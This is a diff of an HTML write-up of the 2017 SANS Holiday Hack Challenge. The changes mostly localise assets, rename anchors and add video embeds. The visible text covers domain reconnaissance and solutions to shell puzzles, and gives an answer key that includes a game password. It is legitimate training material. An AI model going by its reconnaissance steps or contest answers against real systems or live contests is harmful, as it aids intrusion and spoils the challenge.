@@ -180,12 +180,11 @@
   /*]]>*/-->
 </style>
 <link rel="stylesheet" type="text/css" href="css/htmlize.css"/>
-<link rel="stylesheet" type="text/css" href="http://www.pirilampo.org/styles/readtheorg/css/htmlize.css"/>
-<link rel="stylesheet" type="text/css" href="http://www.pirilampo.org/styles/readtheorg/css/readtheorg.css"/>
+<link rel="stylesheet" type="text/css" href="css/readtheorg.css"/>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
 <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/js/bootstrap.min.js"></script>
 <script type="text/javascript" src="js/jquery.stickytableheaders.min.js"></script>
-<script type="text/javascript" src="http://www.pirilampo.org/styles/readtheorg/js/readtheorg.js"></script>
+<script type="text/javascript" src="js/readtheorg.js"></script>
 <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
 <style>#content{max-width:1200px;}</style>
 <script type="text/javascript">
@@ -264,21 +263,21 @@ for the JavaScript code in this tag.
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents">
 <ul>
-<li><a href="#orgd334ad8">Introduction</a></li>
-<li><a href="#orgbf24d1b">tl;dr: Quick Answers</a></li>
-<li><a href="#org4b4381f">Pre-contest Reconnaissance</a>
+<li><a href="#org57f31ee">Introduction</a></li>
+<li><a href="#org1fd8345">tl;dr: Quick Answers</a></li>
+<li><a href="#org7eff15b">Pre-contest Reconnaissance</a>
 <ul>
-<li><a href="#org627681f">Whois Searching</a></li>
-<li><a href="#orgc650d33">DNS Brute Forcing</a></li>
-<li><a href="#orga2e658d">Certificate Transparency Logs</a></li>
-<li><a href="#org99da2a9">Monitoring</a></li>
-<li><a href="#orgfd425cb">And Then Things Changed&#x2026;</a></li>
-<li><a href="#orgf1236ba">Recon Summary</a></li>
+<li><a href="#org26c783d">Whois Searching</a></li>
+<li><a href="#orgb1021c6">DNS Brute Forcing</a></li>
+<li><a href="#orgf726451">Certificate Transparency Logs</a></li>
+<li><a href="#org04e4d46">Monitoring</a></li>
+<li><a href="#orgd3aaabb">And Then Things Changed&#x2026;</a></li>
+<li><a href="#org59ae5f8">Recon Summary</a></li>
 </ul>
 </li>
-<li><a href="#orgc7da064">Terminals</a>
+<li><a href="#org5968fdb">Terminals</a>
 <ul>
-<li><a href="#org0ae9163">Winter Wonder Landing</a>
+<li><a href="#orgbcbcd65">Winter Wonder Landing</a>
 <ul>
 <li><a href="#landing_question">Question</a></li>
 <li><a href="#landing_how-to-find-the-terminal">How to find the terminal</a></li>
@@ -290,7 +289,7 @@ for the JavaScript code in this tag.
 <li><a href="#landing_alternatives">Alternatives</a></li>
 </ul>
 </li>
-<li><a href="#org775a0cb">Winconceivable The Cliffs Of Insanity</a>
+<li><a href="#orgb044635">Winconceivable The Cliffs Of Insanity</a>
 <ul>
 <li><a href="#cliffs_question">Question</a></li>
 <li><a href="#cliffs_how-to-find-the-terminal">How to find the terminal</a></li>
@@ -303,7 +302,7 @@ for the JavaScript code in this tag.
 <li><a href="#cliffs_common-pitfalls">Common Pitfalls</a></li>
 </ul>
 </li>
-<li><a href="#org9a23438">Cryokinetic Magic</a>
+<li><a href="#orgd6efe1a">Cryokinetic Magic</a>
 <ul>
 <li><a href="#cryokinetic_question">Question</a></li>
 <li><a href="#cryokinetic_how-to-find-the-terminal">How to find the terminal</a></li>
@@ -315,7 +314,7 @@ for the JavaScript code in this tag.
 <li><a href="#cryokinetic_alternatives">Alternatives</a></li>
 </ul>
 </li>
-<li><a href="#org5fcf992">There's Snow Place Like Home</a>
+<li><a href="#org3f85b81">There's Snow Place Like Home</a>
 <ul>
 <li><a href="#home_question">Question</a></li>
 <li><a href="#home_how-to-find-the-terminal">How to find the terminal</a></li>
@@ -328,7 +327,7 @@ for the JavaScript code in this tag.
 <li><a href="#home_common-pitfalls">Common Pitfalls</a></li>
 </ul>
 </li>
-<li><a href="#org959931a">Bumble's Bounce</a>
+<li><a href="#org750eba6">Bumble's Bounce</a>
 <ul>
 <li><a href="#bounce_question">Question</a></li>
 <li><a href="#bounce_how-to-find-the-terminal">How to find the terminal</a></li>
@@ -341,7 +340,7 @@ for the JavaScript code in this tag.
 <li><a href="#bounce_common-pitfalls">Common Pitfalls</a></li>
 </ul>
 </li>
-<li><a href="#orgacb3305">I Don't Think We're In Kansas Anymore</a>
+<li><a href="#org01fafce">I Don't Think We're In Kansas Anymore</a>
 <ul>
 <li><a href="#kansas_question">Question</a></li>
 <li><a href="#kansas_how-to-find-the-terminal">How to find the terminal</a></li>
@@ -353,7 +352,7 @@ for the JavaScript code in this tag.
 <li><a href="#kansas_alternatives">Alternatives</a></li>
 </ul>
 </li>
-<li><a href="#org78dc254">Oh Wait Maybe We Are</a>
+<li><a href="#org3a0b37d">Oh Wait Maybe We Are</a>
 <ul>
 <li><a href="#we_are_question">Question</a></li>
 <li><a href="#we_are_how-to-find-the-terminal">How to find the terminal</a></li>
@@ -364,10 +363,10 @@ for the JavaScript code in this tag.
 <li><a href="#we_are_solution">Solution</a></li>
 <li><a href="#we_are_alternatives">Alternatives</a></li>
 <li><a href="#we_are_common-pitfalls">Common Pitfalls</a></li>
-<li><a href="#org6632580">Going Further - Privilege Escalation</a></li>
+<li><a href="#org5a9010e">Going Further - Privilege Escalation</a></li>
 </ul>
 </li>
-<li><a href="#org7ed1cdd">We're Off To See The</a>
+<li><a href="#org5ba2a83">We're Off To See The</a>
 <ul>
 <li><a href="#off_question">Question</a></li>
 <li><a href="#off_how-to-find-the-terminal">How to find the terminal</a></li>
@@ -381,15 +380,15 @@ for the JavaScript code in this tag.
 </li>
 </ul>
 </li>
-<li><a href="#orgb27f4c4"><span class="todo TODO">TODO</span> Answers</a>
+<li><a href="#orgbe12c66"><span class="todo TODO">TODO</span> Answers</a>
 <ul>
-<li><a href="#org8c00b1f">Game: This Page Fell off a Truck</a>
+<li><a href="#org9f54971">Game: This Page Fell off a Truck</a>
 <ul>
 <li><a href="#q1_question">Question</a></li>
 <li><a href="#q2_solution">Solution</a></li>
 </ul>
 </li>
-<li><a href="#org274b925">L2S: Letters to Santa</a>
+<li><a href="#orgfad0903">L2S: Letters to Santa</a>
 <ul>
 <li><a href="#q2_question">Question</a></li>
 <li><a href="#q2_background-information">Background Information</a></li>
@@ -399,10 +398,10 @@ for the JavaScript code in this tag.
 <li><a href="#q2_alternatives">Alternatives</a></li>
 <li><a href="#q2_common-pitfalls">Common Pitfalls</a></li>
 <li><a href="#q2_about-the-challenge">About the Challenge</a></li>
-<li><a href="#org3d17a46">Moving Foward</a></li>
+<li><a href="#orgd038bbf">Moving Foward</a></li>
 </ul>
 </li>
-<li><a href="#org5b76bc9">SMB: Windows Fileshare</a>
+<li><a href="#org84f2201">SMB: Windows Fileshare</a>
 <ul>
 <li><a href="#q3_question">Question</a></li>
 <li><a href="#q3_background-information">Background Information</a></li>
@@ -412,7 +411,7 @@ for the JavaScript code in this tag.
 <li><a href="#q3_common-pitfalls">Common Pitfalls</a></li>
 </ul>
 </li>
-<li><a href="#org1b14128">EWA: Elf Web Access</a>
+<li><a href="#orgbbebfa0">EWA: Elf Web Access</a>
 <ul>
 <li><a href="#q4_question">Question</a></li>
 <li><a href="#q4_background-information">Background Information</a></li>
@@ -423,7 +422,7 @@ for the JavaScript code in this tag.
 <li><a href="#q4_common-pitfalls">Common Pitfalls</a></li>
 </ul>
 </li>
-<li><a href="#org5bcc11b">NPPD: Naughty Moles</a>
+<li><a href="#org0959fd7">NPPD: Naughty Moles</a>
 <ul>
 <li><a href="#q5_question">Question</a></li>
 <li><a href="#q5_background-information">Background Information</a></li>
@@ -432,7 +431,7 @@ for the JavaScript code in this tag.
 <li><a href="#q5_solution">Solution</a></li>
 </ul>
 </li>
-<li><a href="#org28d0ade">EaaS: TODO Question 6</a>
+<li><a href="#orge804d95"><span class="todo TODO">TODO</span> EaaS: Question 6</a>
 <ul>
 <li><a href="#q6_question">Question</a></li>
 <li><a href="#q6_background-information">Background Information</a></li>
@@ -444,20 +443,20 @@ for the JavaScript code in this tag.
 <li><a href="#q6_about-the-challenge">About the Challenge</a></li>
 </ul>
 </li>
-<li><a href="#org9ff07f0">EMI: Going Deep</a>
+<li><a href="#org264a7d6">EMI: Going Deep</a>
 <ul>
 <li><a href="#q7_question">Question</a></li>
 <li><a href="#q7_background-information">Background Information</a></li>
 <li><a href="#q7_goal">Goal</a></li>
 <li><a href="#q7_approach">Approach</a></li>
 <li><a href="#q7_solution">Solution</a></li>
-<li><a href="#org712c4e5">Going Deeper &#x2013; Command Execution</a></li>
-<li><a href="#org652b78f">Level 2 &#x2013; Meterpreter Shell</a></li>
-<li><a href="#org3e8bd2d">Getting Alabaster's Password</a></li>
-<li><a href="#orgbe5b2b9">Next up &#x2013; Privilege Escalation!</a></li>
+<li><a href="#org88240ba">Going Deeper &#x2013; Command Execution</a></li>
+<li><a href="#orgbc22119">Level 2 &#x2013; Meterpreter Shell</a></li>
+<li><a href="#org7cc060c">Getting Alabaster's Password</a></li>
+<li><a href="#org1b29ed7">Next up &#x2013; Privilege Escalation!</a></li>
 </ul>
 </li>
-<li><a href="#org3991694"><span class="todo TODO">TODO</span> EDB: Question 8</a>
+<li><a href="#org0827987">EDB: eLfDAP Injection</a>
 <ul>
 <li><a href="#q8_question">Question</a></li>
 <li><a href="#q8_background-information">Background Information</a></li>
@@ -465,11 +464,9 @@ for the JavaScript code in this tag.
 <li><a href="#q8_approach">Approach</a></li>
 <li><a href="#q8_solution">Solution</a></li>
 <li><a href="#q8_alternatives">Alternatives</a></li>
-<li><a href="#q8_common-pitfalls">Common Pitfalls</a></li>
-<li><a href="#q8_about-the-challenge">About the Challenge</a></li>
 </ul>
 </li>
-<li><a href="#orgd5a4dae">Fin: The Evil Good Witch</a>
+<li><a href="#orgc2f5fd7">Fin: The Evil Good Witch</a>
 <ul>
 <li><a href="#q9_question">Question</a></li>
 <li><a href="#q9_solution">Solution</a></li>
@@ -477,18 +474,18 @@ for the JavaScript code in this tag.
 </li>
 </ul>
 </li>
-<li><a href="#orge4e5f3f">Easter Eggs</a>
+<li><a href="#orgdba669f">Easter Eggs</a>
 <ul>
-<li><a href="#org5ade6b7">Story Page</a>
+<li><a href="#org47e6ef0">Story Page</a>
 <ul>
-<li><a href="#orgeeac070">Wintered logo is based on the Wicked stage musical poster.</a></li>
-<li><a href="#org9079d81">Short video is based on video intro to Rudolph the Red-Nosed Reindeer</a></li>
+<li><a href="#orgcff0efc">Wintered logo is based on the Wicked stage musical poster.</a></li>
+<li><a href="#org43b6174">Short video is based on video intro to Rudolph the Red-Nosed Reindeer</a></li>
 </ul>
 </li>
-<li><a href="#org8480a98">North Pole and Beyond</a>
+<li><a href="#org861cc09">North Pole and Beyond</a>
 <ul>
-<li><a href="#org762c254">Stocking</a></li>
-<li><a href="#org693a1e9">Exploration</a></li>
+<li><a href="#orgd2a32af">Stocking</a></li>
+<li><a href="#orgefc2f35">Exploration</a></li>
 </ul>
 </li>
 </ul>
@@ -497,9 +494,9 @@ for the JavaScript code in this tag.
 </div>
 </div>
 
-<div id="outline-container-orgd334ad8" class="outline-2">
-<h2 id="orgd334ad8">Introduction</h2>
-<div class="outline-text-2" id="text-orgd334ad8">
+<div id="outline-container-org57f31ee" class="outline-2">
+<h2 id="org57f31ee">Introduction</h2>
+<div class="outline-text-2" id="text-org57f31ee">
 <p>
 We are the Security team at the National Center for Supercomputing
 Applications, and we worked together on yet another fun SANS Holiday
@@ -536,9 +533,9 @@ as possible, and we make these tools publicly available.
 </p>
 </div>
 </div>
-<div id="outline-container-orgbf24d1b" class="outline-2">
-<h2 id="orgbf24d1b">tl;dr: Quick Answers</h2>
-<div class="outline-text-2" id="text-orgbf24d1b">
+<div id="outline-container-org1fd8345" class="outline-2">
+<h2 id="org1fd8345">tl;dr: Quick Answers</h2>
+<div class="outline-text-2" id="text-org1fd8345">
 <ol class="org-ol">
 <li>What is the title of the first page? <b>About This Book&#x2026;</b></li>
 <li>What is the topic of The Great Book page available in the web root of the server? <b>On the Topic of Flying Animals</b><br />
@@ -553,9 +550,9 @@ What is Alabaster Snowball's password? <b>stream_unhappy_buy_loss</b></li>
 </ol>
 </div>
 </div>
-<div id="outline-container-org4b4381f" class="outline-2">
-<h2 id="org4b4381f">Pre-contest Reconnaissance</h2>
-<div class="outline-text-2" id="text-org4b4381f">
+<div id="outline-container-org7eff15b" class="outline-2">
+<h2 id="org7eff15b">Pre-contest Reconnaissance</h2>
+<div class="outline-text-2" id="text-org7eff15b">
 
 <div class="figure">
 <p><img src="./images/sans_holiday_hack_preview.png" alt="sans_holiday_hack_preview.png" />
@@ -588,9 +585,9 @@ some clues.
 </p>
 </div>
 
-<div id="outline-container-org627681f" class="outline-3">
-<h3 id="org627681f">Whois Searching</h3>
-<div class="outline-text-3" id="text-org627681f">
+<div id="outline-container-org26c783d" class="outline-3">
+<h3 id="org26c783d">Whois Searching</h3>
+<div class="outline-text-3" id="text-org26c783d">
 <p>
 For example, the 2016 contest made use of the domain
 www.northpolewonderland.com. We can look at publicly available WHOIS
@@ -761,9 +758,9 @@ should be as unintrusive as possible.
 </div>
 </div>
 
-<div id="outline-container-orgc650d33" class="outline-3">
-<h3 id="orgc650d33">DNS Brute Forcing</h3>
-<div class="outline-text-3" id="text-orgc650d33">
+<div id="outline-container-orgb1021c6" class="outline-3">
+<h3 id="orgb1021c6">DNS Brute Forcing</h3>
+<div class="outline-text-3" id="text-orgb1021c6">
 <p>
 Now that we have a domain we're interested in, let's look at DNS:
 </p>
@@ -892,9 +889,9 @@ A couple of other lists resulted in the following hostnames as well:
 </div>
 </div>
 
-<div id="outline-container-orga2e658d" class="outline-3">
-<h3 id="orga2e658d">Certificate Transparency Logs</h3>
-<div class="outline-text-3" id="text-orga2e658d">
+<div id="outline-container-orgf726451" class="outline-3">
+<h3 id="orgf726451">Certificate Transparency Logs</h3>
+<div class="outline-text-3" id="text-orgf726451">
 <p>
 Next, let's turn our attention to the holidayhackchallenge.com
 domain. Last year, there were some new hosts that appeared under this
@@ -958,9 +955,9 @@ certificates that don't look familiar:
 </div>
 </div>
 
-<div id="outline-container-org99da2a9" class="outline-3">
-<h3 id="org99da2a9">Monitoring</h3>
-<div class="outline-text-3" id="text-org99da2a9">
+<div id="outline-container-org04e4d46" class="outline-3">
+<h3 id="org04e4d46">Monitoring</h3>
+<div class="outline-text-3" id="text-org04e4d46">
 <p>
 None of the 3 servers listed above are currently accessible on port 80
 or 443 (HTTP and HTTPS). We setup some monitoring using a free online
@@ -976,9 +973,9 @@ ground running.
 </div>
 </div>
 
-<div id="outline-container-orgfd425cb" class="outline-3">
-<h3 id="orgfd425cb">And Then Things Changed&#x2026;</h3>
-<div class="outline-text-3" id="text-orgfd425cb">
+<div id="outline-container-orgd3aaabb" class="outline-3">
+<h3 id="orgd3aaabb">And Then Things Changed&#x2026;</h3>
+<div class="outline-text-3" id="text-orgd3aaabb">
 <p>
 On December 11th, this setup was changed, and a lot of hosts were
 removed from DNS. We believe that the systems were reconfigured to
@@ -991,9 +988,9 @@ The systems where the configuration changed are marked in italics in the table b
 </div>
 </div>
 
-<div id="outline-container-orgf1236ba" class="outline-3">
-<h3 id="orgf1236ba">Recon Summary</h3>
-<div class="outline-text-3" id="text-orgf1236ba">
+<div id="outline-container-org59ae5f8" class="outline-3">
+<h3 id="org59ae5f8">Recon Summary</h3>
+<div class="outline-text-3" id="text-org59ae5f8">
 <p>
 We can use the following indicators to search any clues we're later provided with:
 </p>
@@ -1194,16 +1191,16 @@ We can use the following indicators to search any clues we're later provided wit
 </div>
 </div>
 </div>
-<div id="outline-container-orgc7da064" class="outline-2">
-<h2 id="orgc7da064">Terminals</h2>
-<div class="outline-text-2" id="text-orgc7da064">
+<div id="outline-container-org5968fdb" class="outline-2">
+<h2 id="org5968fdb">Terminals</h2>
+<div class="outline-text-2" id="text-org5968fdb">
 </div>
-<div id="outline-container-org0ae9163" class="outline-3">
-<h3 id="org0ae9163">Winter Wonder Landing</h3>
-<div class="outline-text-3" id="text-org0ae9163">
+<div id="outline-container-orgbcbcd65" class="outline-3">
+<h3 id="orgbcbcd65">Winter Wonder Landing</h3>
+<div class="outline-text-3" id="text-orgbcbcd65">
 </div>
-<div id="outline-container-org3436530" class="outline-4">
-<h4 id="landing_question"><a id="org3436530"></a>Question</h4>
+<div id="outline-container-org671ec6d" class="outline-4">
+<h4 id="landing_question"><a id="org671ec6d"></a>Question</h4>
 <div class="outline-text-4" id="text-landing_question">
 <pre class="example">
                                  |
@@ -1238,8 +1235,8 @@ Find and run the elftalkd binary to complete this challenge.
 </div>
 </div>
 
-<div id="outline-container-org9e8a665" class="outline-4">
-<h4 id="landing_how-to-find-the-terminal"><a id="org9e8a665"></a>How to find the terminal</h4>
+<div id="outline-container-orgac0893c" class="outline-4">
+<h4 id="landing_how-to-find-the-terminal"><a id="orgac0893c"></a>How to find the terminal</h4>
 <div class="outline-text-4" id="text-landing_how-to-find-the-terminal">
 <p>
 From this game: <a href="https://2017.holidayhackchallenge.com/game/7e48d6aa-4b73-4027-b23b-a6a1a3460d54">https://2017.holidayhackchallenge.com/game/7e48d6aa-4b73-4027-b23b-a6a1a3460d54</a>
@@ -1248,6 +1245,8 @@ From this game: <a href="https://2017.holidayhackchallenge.com/game/7e48d6aa-4b7
 <p>
 Direct Link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=eb5282de-5e43-4813-8ada-5aee3cdb101e&amp;uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=eb5282de-5e43-4813-8ada-5aee3cdb101e&amp;uid=USER_ID</a>
 </p>
+
+<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/VLTddXMbcgw?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
 
 
 <div class="figure">
@@ -1258,8 +1257,8 @@ Direct Link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=eb5
 </div>
 </div>
 
-<div id="outline-container-org9b18182" class="outline-4">
-<h4 id="landing_background-information"><a id="org9b18182"></a>Background Information</h4>
+<div id="outline-container-org549401d" class="outline-4">
+<h4 id="landing_background-information"><a id="org549401d"></a>Background Information</h4>
 <div class="outline-text-4" id="text-landing_background-information">
 <p>
 We are logged in as the user <code>elf</code>. According to Bushy Green's Twitter account someone copied the wrong <code>find</code> executable onto his system.
@@ -1267,8 +1266,8 @@ We are logged in as the user <code>elf</code>. According to Bushy Green's Twitte
 </div>
 </div>
 
-<div id="outline-container-org675a889" class="outline-4">
-<h4 id="landing_goal"><a id="org675a889"></a>Goal</h4>
+<div id="outline-container-org5e1e63c" class="outline-4">
+<h4 id="landing_goal"><a id="org5e1e63c"></a>Goal</h4>
 <div class="outline-text-4" id="text-landing_goal">
 <p>
 According to the Message of the Day (MOTD) we need to find and run the <code>elftalkd</code> binary.
@@ -1276,8 +1275,8 @@ According to the Message of the Day (MOTD) we need to find and run the <code>elf
 </div>
 </div>
 
-<div id="outline-container-org741dcc3" class="outline-4">
-<h4 id="landing_hints"><a id="org741dcc3"></a>Hints</h4>
+<div id="outline-container-orgf5a9110" class="outline-4">
+<h4 id="landing_hints"><a id="orgf5a9110"></a>Hints</h4>
 <div class="outline-text-4" id="text-landing_hints">
 <p>
 Bushy Evergreen on Twitter has a hint:
@@ -1287,8 +1286,8 @@ Bushy Evergreen on Twitter has a hint:
 </div>
 </div>
 
-<div id="outline-container-orgc7e95d2" class="outline-4">
-<h4 id="landing_approach"><a id="orgc7e95d2"></a>Approach</h4>
+<div id="outline-container-org0ace16e" class="outline-4">
+<h4 id="landing_approach"><a id="org0ace16e"></a>Approach</h4>
 <div class="outline-text-4" id="text-landing_approach">
 <p>
 To solve this challenge we need to find a valid version of <code>find</code> on the system or some other viable version to find the <code>elftalkd</code> binary.
@@ -1296,8 +1295,8 @@ To solve this challenge we need to find a valid version of <code>find</code> on 
 </div>
 </div>
 
-<div id="outline-container-org78a086c" class="outline-4">
-<h4 id="landing_solution"><a id="org78a086c"></a>Solution</h4>
+<div id="outline-container-org0ebd1c8" class="outline-4">
+<h4 id="landing_solution"><a id="org0ebd1c8"></a>Solution</h4>
 <div class="outline-text-4" id="text-landing_solution">
 <p>
 First we need to test what's wrong with <code>find</code>.
@@ -1373,8 +1372,8 @@ Background daemon...
 </div>
 </div>
 
-<div id="outline-container-org31a6ca3" class="outline-4">
-<h4 id="landing_alternatives"><a id="org31a6ca3"></a>Alternatives</h4>
+<div id="outline-container-org6db178e" class="outline-4">
+<h4 id="landing_alternatives"><a id="org6db178e"></a>Alternatives</h4>
 <div class="outline-text-4" id="text-landing_alternatives">
 <p>
 The quick method is to iterate through using wildcards to execute the binary.
@@ -1416,12 +1415,12 @@ Initializing Messaging System!
 </div>
 </div>
 </div>
-<div id="outline-container-org775a0cb" class="outline-3">
-<h3 id="org775a0cb">Winconceivable The Cliffs Of Insanity</h3>
-<div class="outline-text-3" id="text-org775a0cb">
+<div id="outline-container-orgb044635" class="outline-3">
+<h3 id="orgb044635">Winconceivable The Cliffs Of Insanity</h3>
+<div class="outline-text-3" id="text-orgb044635">
 </div>
-<div id="outline-container-org718e973" class="outline-4">
-<h4 id="cliffs_question"><a id="org718e973"></a>Question</h4>
+<div id="outline-container-orga672a02" class="outline-4">
+<h4 id="cliffs_question"><a id="orga672a02"></a>Question</h4>
 <div class="outline-text-4" id="text-cliffs_question">
 <pre class="example">
                 ___,@
@@ -1452,8 +1451,8 @@ Kill the "santaslittlehelperd" process to complete this challenge.
 </div>
 </div>
 
-<div id="outline-container-org403a15c" class="outline-4">
-<h4 id="cliffs_how-to-find-the-terminal"><a id="org403a15c"></a>How to find the terminal</h4>
+<div id="outline-container-org6221b53" class="outline-4">
+<h4 id="cliffs_how-to-find-the-terminal"><a id="org6221b53"></a>How to find the terminal</h4>
 <div class="outline-text-4" id="text-cliffs_how-to-find-the-terminal">
 <p>
 From this game: <a href="https://2017.holidayhackchallenge.com/game/3e813a9c-cb34-492e-a317-0dd99c8ca2e7">https://2017.holidayhackchallenge.com/game/3e813a9c-cb34-492e-a317-0dd99c8ca2e7</a>
@@ -1462,6 +1461,8 @@ From this game: <a href="https://2017.holidayhackchallenge.com/game/3e813a9c-cb3
 <p>
 Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=82c16868-a96e-4e4c-955e-5b41f7c5809a&amp;uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=82c16868-a96e-4e4c-955e-5b41f7c5809a&amp;uid=USER_ID</a>
 </p>
+
+<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/LLCUtyC1p2A?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
 
 
 <div class="figure">
@@ -1472,8 +1473,8 @@ Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=82c
 </div>
 </div>
 
-<div id="outline-container-org8e0587b" class="outline-4">
-<h4 id="cliffs_background-information"><a id="org8e0587b"></a>Background Information</h4>
+<div id="outline-container-orgaaa4272" class="outline-4">
+<h4 id="cliffs_background-information"><a id="orgaaa4272"></a>Background Information</h4>
 <div class="outline-text-4" id="text-cliffs_background-information">
 <pre class="example">
 elf@784e43534178:~$ D="------"; echo "$D System info:"; uname -a; cat /etc/issue; echo "$D Differences from skeleton home directory:"; diff -r /etc/skel .; echo "$D Who am I?"; id; echo "$D Running procs:"; ps axf
@@ -1512,8 +1513,8 @@ that we need to kill it. However, we see that in our <code>.bashrc</code> file,
 </div>
 </div>
 
-<div id="outline-container-orgdffb070" class="outline-4">
-<h4 id="cliffs_goal"><a id="orgdffb070"></a>Goal</h4>
+<div id="outline-container-orgf2d276d" class="outline-4">
+<h4 id="cliffs_goal"><a id="orgf2d276d"></a>Goal</h4>
 <div class="outline-text-4" id="text-cliffs_goal">
 <p>
 We need to <code>kill santaslittlehelperd</code>, but our <code>kill</code> has been turned ineffective.
@@ -1521,8 +1522,8 @@ We need to <code>kill santaslittlehelperd</code>, but our <code>kill</code> has 
 </div>
 </div>
 
-<div id="outline-container-org33100c3" class="outline-4">
-<h4 id="cliffs_hints"><a id="org33100c3"></a>Hints</h4>
+<div id="outline-container-org8badaac" class="outline-4">
+<h4 id="cliffs_hints"><a id="org8badaac"></a>Hints</h4>
 <div class="outline-text-4" id="text-cliffs_hints">
 <p>
 Sparkle Redberry on Twitter has some hints:
@@ -1534,8 +1535,8 @@ Sparkle Redberry on Twitter has some hints:
 </div>
 </div>
 
-<div id="outline-container-org4116a63" class="outline-4">
-<h4 id="cliffs_approach"><a id="org4116a63"></a>Approach</h4>
+<div id="outline-container-orgbf036a3" class="outline-4">
+<h4 id="cliffs_approach"><a id="orgbf036a3"></a>Approach</h4>
 <div class="outline-text-4" id="text-cliffs_approach">
 <p>
 From the <a href="http://tldp.org/LDP/abs/html/aliases.html">Bash documentation</a>:
@@ -1604,8 +1605,8 @@ Santa's little helper is no more.
 </div>
 </div>
 
-<div id="outline-container-orgc50392c" class="outline-4">
-<h4 id="cliffs_solution"><a id="orgc50392c"></a>Solution</h4>
+<div id="outline-container-org321537b" class="outline-4">
+<h4 id="cliffs_solution"><a id="org321537b"></a>Solution</h4>
 <div class="outline-text-4" id="text-cliffs_solution">
 <p>
 A one-liner is: <code>/usr/bin/pkill -f santaslittlehelperd</code>. <code>pkill</code> can
@@ -1615,8 +1616,8 @@ against the full name of the process.
 </div>
 </div>
 
-<div id="outline-container-orgeefd3ef" class="outline-4">
-<h4 id="cliffs_alternatives"><a id="orgeefd3ef"></a>Alternatives</h4>
+<div id="outline-container-org26b9ad3" class="outline-4">
+<h4 id="cliffs_alternatives"><a id="org26b9ad3"></a>Alternatives</h4>
 <div class="outline-text-4" id="text-cliffs_alternatives">
 <p>
 Another approach is simply to remove the alias, by using the <code>unalias</code> command:
@@ -1674,8 +1675,8 @@ elf@784e43534178:~$ ps axf
 </div>
 </div>
 
-<div id="outline-container-org104efde" class="outline-4">
-<h4 id="cliffs_common-pitfalls"><a id="org104efde"></a>Common Pitfalls</h4>
+<div id="outline-container-orga5c1125" class="outline-4">
+<h4 id="cliffs_common-pitfalls"><a id="orga5c1125"></a>Common Pitfalls</h4>
 <div class="outline-text-4" id="text-cliffs_common-pitfalls">
 <p>
 The fact that <code>kill</code> was aliased to <code>true</code> was problematic, because
@@ -1687,12 +1688,12 @@ correctly, since the help output would not be displayed.
 </div>
 </div>
 </div>
-<div id="outline-container-org9a23438" class="outline-3">
-<h3 id="org9a23438">Cryokinetic Magic</h3>
-<div class="outline-text-3" id="text-org9a23438">
+<div id="outline-container-orgd6efe1a" class="outline-3">
+<h3 id="orgd6efe1a">Cryokinetic Magic</h3>
+<div class="outline-text-3" id="text-orgd6efe1a">
 </div>
-<div id="outline-container-org6499e0f" class="outline-4">
-<h4 id="cryokinetic_question"><a id="org6499e0f"></a>Question</h4>
+<div id="outline-container-org9a0e621" class="outline-4">
+<h4 id="cryokinetic_question"><a id="org9a0e621"></a>Question</h4>
 <div class="outline-text-4" id="text-cryokinetic_question">
 <pre class="example">
                      ___
@@ -1721,8 +1722,8 @@ Run the CandyCaneStriper executable to complete this challenge.
 </div>
 </div>
 
-<div id="outline-container-org9ce3ce4" class="outline-4">
-<h4 id="cryokinetic_how-to-find-the-terminal"><a id="org9ce3ce4"></a>How to find the terminal</h4>
+<div id="outline-container-orga69c3de" class="outline-4">
+<h4 id="cryokinetic_how-to-find-the-terminal"><a id="orga69c3de"></a>How to find the terminal</h4>
 <div class="outline-text-4" id="text-cryokinetic_how-to-find-the-terminal">
 <p>
 From this game: <a href="https://2017.holidayhackchallenge.com/game/a1f7ac49-8210-436b-9e25-0c19f9ebfe02">https://2017.holidayhackchallenge.com/game/a1f7ac49-8210-436b-9e25-0c19f9ebfe02</a>
@@ -1741,8 +1742,8 @@ Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=da6
 </div>
 </div>
 
-<div id="outline-container-org2fd842c" class="outline-4">
-<h4 id="cryokinetic_background-information"><a id="org2fd842c"></a>Background Information</h4>
+<div id="outline-container-org4cf63cb" class="outline-4">
+<h4 id="cryokinetic_background-information"><a id="org4cf63cb"></a>Background Information</h4>
 <div class="outline-text-4" id="text-cryokinetic_background-information">
 <p>
 TODO
@@ -1750,8 +1751,8 @@ TODO
 </div>
 </div>
 
-<div id="outline-container-org7ffd7da" class="outline-4">
-<h4 id="cryokinetic_goal"><a id="org7ffd7da"></a>Goal</h4>
+<div id="outline-container-org5451f2f" class="outline-4">
+<h4 id="cryokinetic_goal"><a id="org5451f2f"></a>Goal</h4>
 <div class="outline-text-4" id="text-cryokinetic_goal">
 <p>
 We need to run the <code>CandyCaneStriper</code> program. Upon initial inspection we discover that <code>/usr/bin/chmod</code> is empty and <code>CandyCaneStriper</code> has no execution flags set.
@@ -1759,8 +1760,8 @@ We need to run the <code>CandyCaneStriper</code> program. Upon initial inspectio
 </div>
 </div>
 
-<div id="outline-container-org4cc2b8c" class="outline-4">
-<h4 id="cryokinetic_hints"><a id="org4cc2b8c"></a>Hints</h4>
+<div id="outline-container-orgba46231" class="outline-4">
+<h4 id="cryokinetic_hints"><a id="orgba46231"></a>Hints</h4>
 <div class="outline-text-4" id="text-cryokinetic_hints">
 <p>
 <a href="https://twitter.com/GreenesterElf">Holly Evergreen on Twitter has a hint</a>
@@ -1778,8 +1779,8 @@ Is there a way to run an executable binary file under Linux which does not have 
 </blockquote>
 </div>
 </div>
-<div id="outline-container-org8937fe6" class="outline-4">
-<h4 id="cryokinetic_approach"><a id="org8937fe6"></a>Approach</h4>
+<div id="outline-container-orgc094989" class="outline-4">
+<h4 id="cryokinetic_approach"><a id="orgc094989"></a>Approach</h4>
 <div class="outline-text-4" id="text-cryokinetic_approach">
 <p>
